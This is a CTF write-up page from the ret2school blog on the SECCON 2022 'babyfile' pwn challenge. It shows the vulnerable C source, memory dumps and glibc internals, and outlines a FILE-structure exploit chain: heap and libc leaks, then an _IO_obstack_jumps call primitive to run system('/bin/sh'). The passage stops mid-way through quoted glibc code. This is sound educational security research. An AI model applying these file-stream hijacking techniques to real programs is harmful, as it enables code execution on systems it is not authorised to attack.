@@ -1,0 +1,1034 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title>[SECCON CTF 2022 Quals] babyfile // ret2school</title>
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.92.2" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="nasm" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="https://ret2school.github.io/css/main.min.88e7083eff65effb7485b6e6f38d10afbec25093a6fac42d734ce9024d3defbd.css" />
+
+    
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-8K5XT0SJN8"></script>
+<script>
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.dataLayer = window.dataLayer || [];
+	function gtag(){dataLayer.push(arguments);}
+	gtag('js', new Date());
+	gtag('config', 'G-8K5XT0SJN8', { 'anonymize_ip': false });
+}
+</script>
+
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="[SECCON CTF 2022 Quals] babyfile"/>
+<meta name="twitter:description" content="Introduction babyfile is a file stream exploitation I did during the SECCON CTF 2022 Quals event. I didn’t succeed to flag it within the 24 hours :(. But anyway I hope this write up will be interesting to read given I show another way to gain code execution &ndash; I have not seen before &ndash; based on _IO_obstack_jumps! The related files can be found here. If you&rsquo;re not familiar with file stream internals, I advice you to read my previous writeups about file stream exploitation, especially this one and this other one."/>
+
+    <meta property="og:title" content="[SECCON CTF 2022 Quals] babyfile" />
+<meta property="og:description" content="Introduction babyfile is a file stream exploitation I did during the SECCON CTF 2022 Quals event. I didn’t succeed to flag it within the 24 hours :(. But anyway I hope this write up will be interesting to read given I show another way to gain code execution &ndash; I have not seen before &ndash; based on _IO_obstack_jumps! The related files can be found here. If you&rsquo;re not familiar with file stream internals, I advice you to read my previous writeups about file stream exploitation, especially this one and this other one." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://ret2school.github.io/post/babyfile/" /><meta property="article:section" content="post" />
+<meta property="article:published_time" content="2022-08-19T00:00:00+00:00" />
+<meta property="article:modified_time" content="2022-08-19T00:00:00+00:00" />
+
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://ret2school.github.io"><img class="app-header-avatar" src="/pic.jpeg" alt="nasm" /></a>
+      <h1>ret2school</h1>
+      <nav class="app-header-menu">
+          <a class="app-header-menu-item" href="/">Home</a>
+             / 
+          
+          <a class="app-header-menu-item" href="/tags/">Tags</a>
+      </nav>
+      <p>Just a bunch of french ctf players</p>
+      <div class="app-header-social">
+        
+          <a target="_blank" href="https://github.com/ret2school" rel="noreferrer noopener"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github">
+  <title>github</title>
+  <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
+</svg></a>
+        
+          <a target="_blank" href="https://twitter.com/ret2school_fr" rel="noreferrer noopener"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-twitter">
+  <title>twitter</title>
+  <path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path>
+</svg></a>
+        
+      </div>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">[SECCON CTF 2022 Quals] babyfile</h1>
+      <div class="post-meta">
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          Aug 19, 2022
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          20 min read
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tag">
+  <title>tag</title>
+  <path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line>
+</svg>
+              <a class="tag" href="https://ret2school.github.io/tags/ctf/">ctf</a>
+              <a class="tag" href="https://ret2school.github.io/tags/nasm/">nasm</a>
+              <a class="tag" href="https://ret2school.github.io/tags/pwn/">pwn</a>
+              <a class="tag" href="https://ret2school.github.io/tags/linux/">linux</a>
+              <a class="tag" href="https://ret2school.github.io/tags/seccon/">SECCON</a>
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <h1 id="introduction">Introduction</h1>
+<p>babyfile is a file stream exploitation I did during the <a href="https://ctftime.org/event/1764">SECCON CTF 2022 Quals</a> event. I didn’t succeed to flag it within the 24 hours :(. But anyway I hope this write up will be interesting to read given I show another way to gain code execution &ndash; I have not seen before &ndash; based on <code>_IO_obstack_jumps</code>! The related files can be found <a href="https://github.com/ret2school/ctf/tree/master/2022/seccon/pwn/babyfile">here</a>. If you&rsquo;re not familiar with file stream internals, I advice you to read my previous writeups about file stream exploitation, especially <a href="../catastrophe">this one</a> and <a href="../filestream">this other one</a>.</p>
+<h2 id="tldr">TL;DR</h2>
+<ul>
+<li>Populate base buffer with heap addresses with the help of <code>_IO_file_doallocate</code>.</li>
+<li>Make both input and output buffer equal to the base buffer with the help of <code>_IO_file_underflow</code>.</li>
+<li>Partial overwrite on right pointers to get a libc leak by simply flushing the file stream.</li>
+<li>Leak a heap address by printing a pointer stored within the main_arena.</li>
+<li><code>_IO_obstack_overflow</code> ends up calling a function pointer stored within the file stream we have control over which leads to a call primitive (plus control over the first argument). Then I just called <code>system(&quot;/bin/sh\x00&quot;)</code>.</li>
+</ul>
+<h1 id="what-we-have">What we have</h1>
+<p>The challenge is basically opening <code>/dev/null</code>, asking for an offset and a value to write at <code>fp + offset</code>. And we can freely flush <code>fp</code>. The source code is prodided:</p>
+<p>Source code:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;stdio.h&gt;</span><span style="color:#ff79c6">
+</span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;stdlib.h&gt;</span><span style="color:#ff79c6">
+</span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;unistd.h&gt;</span><span style="color:#ff79c6">
+</span><span style="color:#ff79c6"></span>
+<span style="color:#ff79c6">static</span> <span style="color:#8be9fd">int</span> <span style="color:#50fa7b">menu</span>(<span style="color:#8be9fd">void</span>);
+<span style="color:#ff79c6">static</span> <span style="color:#8be9fd">int</span> <span style="color:#50fa7b">getnline</span>(<span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>buf, <span style="color:#8be9fd">int</span> size);
+<span style="color:#ff79c6">static</span> <span style="color:#8be9fd">int</span> <span style="color:#50fa7b">getint</span>(<span style="color:#8be9fd">void</span>);
+
+<span style="color:#ff79c6">#define write_str(s) write(STDOUT_FILENO, s, sizeof(s)-1)
+</span><span style="color:#ff79c6"></span>
+<span style="color:#8be9fd">int</span> <span style="color:#50fa7b">main</span>(<span style="color:#8be9fd">void</span>){
+	FILE <span style="color:#ff79c6">*</span>fp;
+
+	alarm(<span style="color:#bd93f9">30</span>);
+
+	write_str(<span style="color:#f1fa8c">&#34;Play with FILE structure</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>);
+
+	<span style="color:#ff79c6">if</span>(<span style="color:#ff79c6">!</span>(fp <span style="color:#ff79c6">=</span> fopen(<span style="color:#f1fa8c">&#34;/dev/null&#34;</span>, <span style="color:#f1fa8c">&#34;r&#34;</span>))){
+		write_str(<span style="color:#f1fa8c">&#34;Open error&#34;</span>);
+		<span style="color:#ff79c6">return</span> <span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>;
+	}
+	fp<span style="color:#ff79c6">-&gt;</span>_wide_data <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">NULL</span>;
+
+	<span style="color:#ff79c6">for</span>(;;){
+		<span style="color:#ff79c6">switch</span>(menu()){
+			<span style="color:#ff79c6">case</span> <span style="color:#bd93f9">0</span><span style="color:#ff79c6">:</span>
+				<span style="color:#ff79c6">goto</span> END;
+			<span style="color:#ff79c6">case</span> <span style="color:#bd93f9">1</span><span style="color:#ff79c6">:</span>
+				fflush(fp);
+				<span style="color:#ff79c6">break</span>;
+			<span style="color:#ff79c6">case</span> <span style="color:#bd93f9">2</span><span style="color:#ff79c6">:</span>
+				{
+					<span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">char</span> ofs;
+					write_str(<span style="color:#f1fa8c">&#34;offset: &#34;</span>);
+					<span style="color:#ff79c6">if</span>((ofs <span style="color:#ff79c6">=</span> getint()) <span style="color:#ff79c6">&amp;</span> <span style="color:#bd93f9">0x80</span>)
+						ofs <span style="color:#ff79c6">|=</span> <span style="color:#bd93f9">0x40</span>;
+					write_str(<span style="color:#f1fa8c">&#34;value: &#34;</span>);
+					((<span style="color:#8be9fd">char</span><span style="color:#ff79c6">*</span>)fp)[ofs] <span style="color:#ff79c6">=</span> getint();
+				}
+				<span style="color:#ff79c6">break</span>;
+		}
+		write_str(<span style="color:#f1fa8c">&#34;Done.</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>);
+	}
+
+<span style="color:#8be9fd;font-style:italic">END</span>:
+	write_str(<span style="color:#f1fa8c">&#34;Bye!&#34;</span>);
+	_exit(<span style="color:#bd93f9">0</span>);
+}
+
+<span style="color:#ff79c6">static</span> <span style="color:#8be9fd">int</span> <span style="color:#50fa7b">menu</span>(<span style="color:#8be9fd">void</span>){
+	write_str(<span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">MENU</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>
+			<span style="color:#f1fa8c">&#34;1. Flush</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>
+			<span style="color:#f1fa8c">&#34;2. Trick</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>
+			<span style="color:#f1fa8c">&#34;0. Exit</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>
+			<span style="color:#f1fa8c">&#34;&gt; &#34;</span>);
+
+	<span style="color:#ff79c6">return</span> getint();
+}
+
+<span style="color:#ff79c6">static</span> <span style="color:#8be9fd">int</span> <span style="color:#50fa7b">getnline</span>(<span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>buf, <span style="color:#8be9fd">int</span> size){
+	<span style="color:#8be9fd">int</span> len;
+
+	<span style="color:#ff79c6">if</span>(size <span style="color:#ff79c6">&lt;=</span> <span style="color:#bd93f9">0</span> <span style="color:#ff79c6">||</span> (len <span style="color:#ff79c6">=</span> read(STDIN_FILENO, buf, size<span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>)) <span style="color:#ff79c6">&lt;=</span> <span style="color:#bd93f9">0</span>)
+		<span style="color:#ff79c6">return</span> <span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>;
+
+	<span style="color:#ff79c6">if</span>(buf[len<span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>]<span style="color:#ff79c6">==</span><span style="color:#f1fa8c">&#39;\n&#39;</span>)
+		len<span style="color:#ff79c6">--</span>;
+	buf[len] <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;\0&#39;</span>;
+
+	<span style="color:#ff79c6">return</span> len;
+}
+
+<span style="color:#ff79c6">static</span> <span style="color:#8be9fd">int</span> <span style="color:#50fa7b">getint</span>(<span style="color:#8be9fd">void</span>){
+	<span style="color:#8be9fd">char</span> buf[<span style="color:#bd93f9">0x10</span>] <span style="color:#ff79c6">=</span> {};
+
+	getnline(buf, <span style="color:#ff79c6">sizeof</span>(buf));
+	<span style="color:#ff79c6">return</span> atoi(buf);
+}
+</code></pre></div><h1 id="exploitation-ideas">Exploitation ideas</h1>
+<p>I tried (in this order) to:</p>
+<ul>
+<li>Get a libc leak by calling <code>_IO_file_underflow</code> to make input and output buffers equal to the base buffer that contains with the help of <code>_IO_file_doallocate</code> a heap address. And then flushing the file stream to leak the libc.</li>
+<li>Get a heap leak by leaking a heap pointer stored within the <code>main_arena</code>.</li>
+<li>Get an arbitrary write with a tcache dup technique, I got <code>__free_hook</code> as the last pointer available in the target tcache bin but I didn&rsquo;t succeeded to get a shell &gt;.&lt;.</li>
+<li>Call primitive with control over the first argument by calling <code>_IO_obstack_overflow</code> (part of the <code>_IO_obstack_jumps</code> vtable). Then it allows us to call <code>system(&quot;/bin/sh\x00&quot;)</code>.</li>
+</ul>
+<h2 id="libc-leak">Libc leak</h2>
+<p>To get a libc leak we have to write on stdout a certain amount of bytes that leak a libc address. To do so we&rsquo;re looking for a way to make interesting pointers appear as the base buffer to then initialize both input and output buffer to the base buffer and then do a partial overwrite on these fields to point to an area that contains libc pointers. To get heap addresses within the base buffer we can misalign the vtable in such a way that <code>fp-&gt;vtable-&gt;sync()</code> calls <code>_IO_default_doallocate</code>. Then <code>_IO_default_doallocate</code> is called and does some operations:</p>
+<p>The initial state of the file stream looks like this:</p>
+<pre tabindex="0"><code>0x559c0955e2a0: 0x00000000fbad2488      0x0000000000000000
+0x559c0955e2b0: 0x0000000000000000      0x0000000000000000
+0x559c0955e2c0: 0x0000000000000000      0x0000000000000000
+0x559c0955e2d0: 0x0000000000000000      0x0000000000000000
+0x559c0955e2e0: 0x0000000000000000      0x0000000000000000
+0x559c0955e2f0: 0x0000000000000000      0x0000000000000000
+0x559c0955e300: 0x0000000000000000      0x00007f99db7c05c0
+0x559c0955e310: 0x0000000000000003      0x0000000000000000
+0x559c0955e320: 0x0000000000000000      0x0000559c0955e380
+0x559c0955e330: 0xffffffffffffffff      0x0000000000000000
+0x559c0955e340: 0x0000000000000000      0x0000000000000000
+0x559c0955e350: 0x0000000000000000      0x0000000000000000
+0x559c0955e360: 0x0000000000000000      0x0000000000000000
+0x559c0955e370: 0x0000000000000000      0x00007f99db7bc4a8
+0x559c0955e380: 0x0000000100000001      0x00007f99db7c6580
+</code></pre><p>It initializes the base buffer to a fresh <code>BUFSIZE</code> allocated buffer.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#8be9fd">int</span>
+<span style="color:#50fa7b">_IO_default_doallocate</span> (FILE <span style="color:#ff79c6">*</span>fp)
+{
+  <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>buf;
+
+  buf <span style="color:#ff79c6">=</span> malloc(BUFSIZ);
+  <span style="color:#ff79c6">if</span> (__glibc_unlikely (buf <span style="color:#ff79c6">==</span> <span style="color:#8be9fd;font-style:italic">NULL</span>))
+    <span style="color:#ff79c6">return</span> EOF;
+
+  _IO_setb (fp, buf, buf<span style="color:#ff79c6">+</span>BUFSIZ, <span style="color:#bd93f9">1</span>);
+  <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">1</span>;
+}
+</code></pre></div><pre tabindex="0"><code>0x559c0955e2a0: 0x00000000fbad2488      0x0000000000000000
+0x559c0955e2b0: 0x0000000000000000      0x0000000000000000
+0x559c0955e2c0: 0x0000000000000000      0x0000000000000000
+0x559c0955e2d0: 0x0000000000000000      0x0000559c0955e480
+0x559c0955e2e0: 0x0000559c09560480      0x0000000000000000
+0x559c0955e2f0: 0x0000000000000000      0x0000000000000000
+0x559c0955e300: 0x0000000000000000      0x00007f99db7c05c0
+0x559c0955e310: 0x0000000000000003      0x0000000000000000
+0x559c0955e320: 0x0000000000000000      0x0000559c0955e380
+0x559c0955e330: 0xffffffffffffffff      0x0000000000000000
+0x559c0955e340: 0x0000000000000000      0x0000000000000000
+0x559c0955e350: 0x0000000000000000      0x0000000000000000
+0x559c0955e360: 0x0000000000000000      0x0000000000000000
+0x559c0955e370: 0x0000000000000000      0x00007f99db7bc4a8
+0x559c0955e380: 0x0000000100000001      0x00007f99db7c6580
+</code></pre><p>Once we have a valid pointer into the base buffer, we try to get into both the input and output buffer the base pointer.
+Given the input / output buffer are <code>NULL</code> and that <code>fp-&gt;flags</code> is <code>0xfbad1800 | 0x8000</code> (plus <code>0x8000</code> =&gt; <code>_IO_USER_LOCK</code> to not stuck into <code>fflush</code>), we do not have issues with the checks. The issue with the <code>_IO_SYSREAD</code> call is described in the code below.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#8be9fd">int</span>
+<span style="color:#50fa7b">_IO_new_file_underflow</span> (FILE <span style="color:#ff79c6">*</span>fp)
+{
+  ssize_t count;
+
+  <span style="color:#6272a4">/* C99 requires EOF to be &#34;sticky&#34;.  */</span>
+  <span style="color:#ff79c6">if</span> (fp<span style="color:#ff79c6">-&gt;</span>_flags <span style="color:#ff79c6">&amp;</span> _IO_EOF_SEEN)
+    <span style="color:#ff79c6">return</span> EOF;
+
+  <span style="color:#ff79c6">if</span> (fp<span style="color:#ff79c6">-&gt;</span>_flags <span style="color:#ff79c6">&amp;</span> _IO_NO_READS)
+    {
+      fp<span style="color:#ff79c6">-&gt;</span>_flags <span style="color:#ff79c6">|=</span> _IO_ERR_SEEN;
+      __set_errno (EBADF);
+      <span style="color:#ff79c6">return</span> EOF;
+    }
+  <span style="color:#ff79c6">if</span> (fp<span style="color:#ff79c6">-&gt;</span>_IO_read_ptr <span style="color:#ff79c6">&lt;</span> fp<span style="color:#ff79c6">-&gt;</span>_IO_read_end)
+    <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">*</span>(<span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>) fp<span style="color:#ff79c6">-&gt;</span>_IO_read_ptr;
+
+  <span style="color:#ff79c6">if</span> (fp<span style="color:#ff79c6">-&gt;</span>_IO_buf_base <span style="color:#ff79c6">==</span> <span style="color:#8be9fd;font-style:italic">NULL</span>)
+    {
+      <span style="color:#6272a4">/* Maybe we already have a push back pointer.  */</span>
+      <span style="color:#ff79c6">if</span> (fp<span style="color:#ff79c6">-&gt;</span>_IO_save_base <span style="color:#ff79c6">!=</span> <span style="color:#8be9fd;font-style:italic">NULL</span>)
+	{
+	  free (fp<span style="color:#ff79c6">-&gt;</span>_IO_save_base);
+	  fp<span style="color:#ff79c6">-&gt;</span>_flags <span style="color:#ff79c6">&amp;=</span> <span style="color:#ff79c6">~</span>_IO_IN_BACKUP;
+	}
+      _IO_doallocbuf (fp);
+    }
+
+  <span style="color:#6272a4">/* FIXME This can/should be moved to genops ?? */</span>
+  <span style="color:#ff79c6">if</span> (fp<span style="color:#ff79c6">-&gt;</span>_flags <span style="color:#ff79c6">&amp;</span> (_IO_LINE_BUF<span style="color:#ff79c6">|</span>_IO_UNBUFFERED))
+    {
+      <span style="color:#6272a4">/* We used to flush all line-buffered stream.  This really isn&#39;t
+</span><span style="color:#6272a4">	 required by any standard.  My recollection is that
+</span><span style="color:#6272a4">	 traditional Unix systems did this for stdout.  stderr better
+</span><span style="color:#6272a4">	 not be line buffered.  So we do just that here
+</span><span style="color:#6272a4">	 explicitly.  --drepper */</span>
+      _IO_acquire_lock (stdout);
+
+      <span style="color:#ff79c6">if</span> ((stdout<span style="color:#ff79c6">-&gt;</span>_flags <span style="color:#ff79c6">&amp;</span> (_IO_LINKED <span style="color:#ff79c6">|</span> _IO_NO_WRITES <span style="color:#ff79c6">|</span> _IO_LINE_BUF))
+	  <span style="color:#ff79c6">==</span> (_IO_LINKED <span style="color:#ff79c6">|</span> _IO_LINE_BUF))
+	_IO_OVERFLOW (stdout, EOF);
+
+      _IO_release_lock (stdout);
+    }
+
+  _IO_switch_to_get_mode (fp);
+
+  <span style="color:#6272a4">/* This is very tricky. We have to adjust those
+</span><span style="color:#6272a4">     pointers before we call _IO_SYSREAD () since
+</span><span style="color:#6272a4">     we may longjump () out while waiting for
+</span><span style="color:#6272a4">     input. Those pointers may be screwed up. H.J. */</span>
+  fp<span style="color:#ff79c6">-&gt;</span>_IO_read_base <span style="color:#ff79c6">=</span> fp<span style="color:#ff79c6">-&gt;</span>_IO_read_ptr <span style="color:#ff79c6">=</span> fp<span style="color:#ff79c6">-&gt;</span>_IO_buf_base;
+  fp<span style="color:#ff79c6">-&gt;</span>_IO_read_end <span style="color:#ff79c6">=</span> fp<span style="color:#ff79c6">-&gt;</span>_IO_buf_base;
+  fp<span style="color:#ff79c6">-&gt;</span>_IO_write_base <span style="color:#ff79c6">=</span> fp<span style="color:#ff79c6">-&gt;</span>_IO_write_ptr <span style="color:#ff79c6">=</span> fp<span style="color:#ff79c6">-&gt;</span>_IO_write_end
+    <span style="color:#ff79c6">=</span> fp<span style="color:#ff79c6">-&gt;</span>_IO_buf_base;
+
+  <span style="color:#6272a4">/* Given the vtable is misaligned, _IO_SYSREAD will call 
+</span><span style="color:#6272a4">  _IO_default_pbackfail, the code is given after _IO_new_file_underflow */</span>
+  count <span style="color:#ff79c6">=</span> _IO_SYSREAD (fp, fp<span style="color:#ff79c6">-&gt;</span>_IO_buf_base,
+		       fp<span style="color:#ff79c6">-&gt;</span>_IO_buf_end <span style="color:#ff79c6">-</span> fp<span style="color:#ff79c6">-&gt;</span>_IO_buf_base);
+
+
+  <span style="color:#ff79c6">if</span> (count <span style="color:#ff79c6">&lt;=</span> <span style="color:#bd93f9">0</span>)
+    {
+      <span style="color:#ff79c6">if</span> (count <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">0</span>)
+	fp<span style="color:#ff79c6">-&gt;</span>_flags <span style="color:#ff79c6">|=</span> _IO_EOF_SEEN;
+      <span style="color:#ff79c6">else</span>
+	fp<span style="color:#ff79c6">-&gt;</span>_flags <span style="color:#ff79c6">|=</span> _IO_ERR_SEEN, count <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;
+  }
+  fp<span style="color:#ff79c6">-&gt;</span>_IO_read_end <span style="color:#ff79c6">+=</span> count;
+  <span style="color:#ff79c6">if</span> (count <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">0</span>)
+    {
+      <span style="color:#6272a4">/* If a stream is read to EOF, the calling application may switch active
+</span><span style="color:#6272a4">	 handles.  As a result, our offset cache would no longer be valid, so
+</span><span style="color:#6272a4">	 unset it.  */</span>
+      fp<span style="color:#ff79c6">-&gt;</span>_offset <span style="color:#ff79c6">=</span> _IO_pos_BAD;
+      <span style="color:#ff79c6">return</span> EOF;
+    }
+  <span style="color:#ff79c6">if</span> (fp<span style="color:#ff79c6">-&gt;</span>_offset <span style="color:#ff79c6">!=</span> _IO_pos_BAD)
+    _IO_pos_adjust (fp<span style="color:#ff79c6">-&gt;</span>_offset, count);
+  <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">*</span>(<span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>) fp<span style="color:#ff79c6">-&gt;</span>_IO_read_ptr;
+}
+libc_hidden_ver (_IO_new_file_underflow, _IO_file_underflow)
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#8be9fd">int</span>
+<span style="color:#50fa7b">_IO_default_pbackfail</span> (FILE <span style="color:#ff79c6">*</span>fp, <span style="color:#8be9fd">int</span> c)
+{
+  <span style="color:#ff79c6">if</span> (fp<span style="color:#ff79c6">-&gt;</span>_IO_read_ptr <span style="color:#ff79c6">&gt;</span> fp<span style="color:#ff79c6">-&gt;</span>_IO_read_base <span style="color:#ff79c6">&amp;&amp;</span> <span style="color:#ff79c6">!</span>_IO_in_backup (fp)
+      <span style="color:#ff79c6">&amp;&amp;</span> (<span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">char</span>) fp<span style="color:#ff79c6">-&gt;</span>_IO_read_ptr[<span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>] <span style="color:#ff79c6">==</span> c)
+    <span style="color:#ff79c6">--</span>fp<span style="color:#ff79c6">-&gt;</span>_IO_read_ptr;
+  <span style="color:#ff79c6">else</span>
+    {
+      <span style="color:#6272a4">/* Need to handle a filebuf in write mode (switch to read mode). FIXME!*/</span>
+      <span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">!</span>_IO_in_backup (fp))
+	{
+	  <span style="color:#6272a4">/* We need to keep the invariant that the main get area
+</span><span style="color:#6272a4">	     logically follows the backup area.  */</span>
+	  <span style="color:#ff79c6">if</span> (fp<span style="color:#ff79c6">-&gt;</span>_IO_read_ptr <span style="color:#ff79c6">&gt;</span> fp<span style="color:#ff79c6">-&gt;</span>_IO_read_base <span style="color:#ff79c6">&amp;&amp;</span> _IO_have_backup (fp))
+	    {
+	      <span style="color:#ff79c6">if</span> (save_for_backup (fp, fp<span style="color:#ff79c6">-&gt;</span>_IO_read_ptr))
+		<span style="color:#ff79c6">return</span> EOF;
+	    }
+	  <span style="color:#ff79c6">else</span> <span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">!</span>_IO_have_backup (fp))
+	    {
+        <span style="color:#6272a4">// !! We should take this path cuz there is no save buffer plus we do not have the backup flag
+</span><span style="color:#6272a4"></span>	      <span style="color:#6272a4">/* No backup buffer: allocate one. */</span>
+	      <span style="color:#6272a4">/* Use nshort buffer, if unused? (probably not)  FIXME */</span>
+	      <span style="color:#8be9fd">int</span> backup_size <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">128</span>;
+	      <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>bbuf <span style="color:#ff79c6">=</span> (<span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>) malloc (backup_size);
+	      <span style="color:#ff79c6">if</span> (bbuf <span style="color:#ff79c6">==</span> <span style="color:#8be9fd;font-style:italic">NULL</span>)
+		<span style="color:#ff79c6">return</span> EOF;
+	      fp<span style="color:#ff79c6">-&gt;</span>_IO_save_base <span style="color:#ff79c6">=</span> bbuf;
+	      fp<span style="color:#ff79c6">-&gt;</span>_IO_save_end <span style="color:#ff79c6">=</span> fp<span style="color:#ff79c6">-&gt;</span>_IO_save_base <span style="color:#ff79c6">+</span> backup_size;
+	      fp<span style="color:#ff79c6">-&gt;</span>_IO_backup_base <span style="color:#ff79c6">=</span> fp<span style="color:#ff79c6">-&gt;</span>_IO_save_end;
+	    }
+	  fp<span style="color:#ff79c6">-&gt;</span>_IO_read_base <span style="color:#ff79c6">=</span> fp<span style="color:#ff79c6">-&gt;</span>_IO_read_ptr;
+	  _IO_switch_to_backup_area (fp);
+	}
+      <span style="color:#ff79c6">else</span> <span style="color:#ff79c6">if</span> (fp<span style="color:#ff79c6">-&gt;</span>_IO_read_ptr <span style="color:#ff79c6">&lt;=</span> fp<span style="color:#ff79c6">-&gt;</span>_IO_read_base)
+	{
+	  <span style="color:#6272a4">/* Increase size of existing backup buffer. */</span>
+	  size_t new_size;
+	  size_t old_size <span style="color:#ff79c6">=</span> fp<span style="color:#ff79c6">-&gt;</span>_IO_read_end <span style="color:#ff79c6">-</span> fp<span style="color:#ff79c6">-&gt;</span>_IO_read_base;
+	  <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>new_buf;
+	  new_size <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">2</span> <span style="color:#ff79c6">*</span> old_size;
+	  new_buf <span style="color:#ff79c6">=</span> (<span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>) malloc (new_size);
+	  <span style="color:#ff79c6">if</span> (new_buf <span style="color:#ff79c6">==</span> <span style="color:#8be9fd;font-style:italic">NULL</span>)
+            <span style="color:#ff79c6">return</span> EOF;
+	  memcpy (new_buf <span style="color:#ff79c6">+</span> (new_size <span style="color:#ff79c6">-</span> old_size), fp<span style="color:#ff79c6">-&gt;</span>_IO_read_base,
+		  old_size);
+	  free (fp<span style="color:#ff79c6">-&gt;</span>_IO_read_base);
+	  _IO_setg (fp, new_buf, new_buf <span style="color:#ff79c6">+</span> (new_size <span style="color:#ff79c6">-</span> old_size),
+		    new_buf <span style="color:#ff79c6">+</span> new_size);
